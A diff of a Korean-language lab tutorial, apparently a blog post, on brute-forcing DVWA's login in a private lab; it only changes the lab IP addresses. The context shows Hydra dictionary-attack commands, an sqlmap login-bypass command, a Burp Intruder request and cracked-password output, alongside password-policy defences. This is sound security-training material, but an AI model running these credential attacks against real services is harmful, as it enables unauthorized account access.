@@ -24,8 +24,8 @@ mermaid: true
 
 | 항목 | 내용 |
 |---|---|
-| 공격 머신 | Kali Linux — `192.168.0.10` |
-| 대상 서버 | Ubuntu + DVWA — `192.168.0.30/DVWA/` |
+| 공격 머신 | Kali Linux — `192.168.56.10` |
+| 대상 서버 | Ubuntu + DVWA — `192.168.56.30/DVWA/` |
 | 주요 도구 | Hydra, Burp Suite, SQLmap |
 
 ---
@@ -171,7 +171,7 @@ flowchart TD
 
 ### 4.1 수동 테스트로 취약점 확인
 
-1. 브라우저에서 `http://192.168.0.30/DVWA/` 접속 후 로그인합니다.
+1. 브라우저에서 `http://192.168.56.30/DVWA/` 접속 후 로그인합니다.
 2. 좌측 메뉴에서 **Brute Force** 를 클릭합니다.
 3. 잘못된 계정(`test / test`)을 입력하면 다음과 같은 메시지가 출력됩니다.
 
@@ -198,7 +198,7 @@ Burp Suite의 **Intruder** 기능으로 패스워드 목록 대입 공격을 수
 
    ```http
    GET /DVWA/vulnerabilities/brute/?username=admin&password=test&Login=Login HTTP/1.1
-   Host: 192.168.0.30
+   Host: 192.168.56.30
    Cookie: PHPSESSID=abcdef1234567890; security=low
    ```
 
@@ -239,7 +239,7 @@ Burp Suite의 **Intruder** 기능으로 패스워드 목록 대입 공격을 수
 
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-  192.168.0.30 \
+  192.168.56.30 \
   http-get-form \
   "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=<세션ID>; security=low"
 ```
@@ -248,7 +248,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-  192.168.0.30 \
+  192.168.56.30 \
   http-post-form \
   "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
 ```
@@ -273,7 +273,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 #### 예상 출력
 
 ```
-[80][http-get-form] host: 192.168.0.30   login: admin   password: password
+[80][http-get-form] host: 192.168.56.30   login: admin   password: password
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -284,7 +284,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 인증 페이지에 SQL Injection 취약점이 함께 있다면, **SQLmap**으로 로그인을 우회할 수 있습니다.
 
 ```bash
-sqlmap -u "http://192.168.0.30/DVWA/vulnerabilities/brute/?username=admin&password=test&Login=Login" \
+sqlmap -u "http://192.168.56.30/DVWA/vulnerabilities/brute/?username=admin&password=test&Login=Login" \
   --cookie="PHPSESSID=<세션ID>; security=low" \
   --data="username=admin&password=test&Login=Login" \
   --batch \
@@ -323,7 +323,7 @@ Hydra는 기본적으로 빠른 속도로 요청하므로, 딜레이 없이 그�
 # -w 5: 응답 대기 시간 5초
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   -t 1 -w 5 \
-  192.168.0.30 \
+  192.168.56.30 \
   http-get-form \
   "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: PHPSESSID=<세션ID>; security=medium"
 ```
@@ -491,7 +491,7 @@ echo strlen($pw) > 0 ? "가입 완료(검증 없음): $pw" : "비밀번호 입�
 ```
 
 ```bash
-curl -s -X POST http://192.168.0.30/signup.php -d "pw=1234"   # 약한 비번이 통과되면 취약
+curl -s -X POST http://192.168.56.30/signup.php -d "pw=1234"   # 약한 비번이 통과되면 취약
 ```
 
 ### 9.2 복잡도 규정 (KISA 권고)
@@ -538,7 +538,7 @@ function isPasswordStrong(pw) {
 DVWA의 **Insecure CAPTCHA** 모듈로 "CAPTCHA가 있어도 우회되는" 사례를 확인합니다.
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/captcha/
+http://192.168.56.30/DVWA/vulnerabilities/captcha/
 ```
 
 | 레벨 | 문제점 | 우회 |
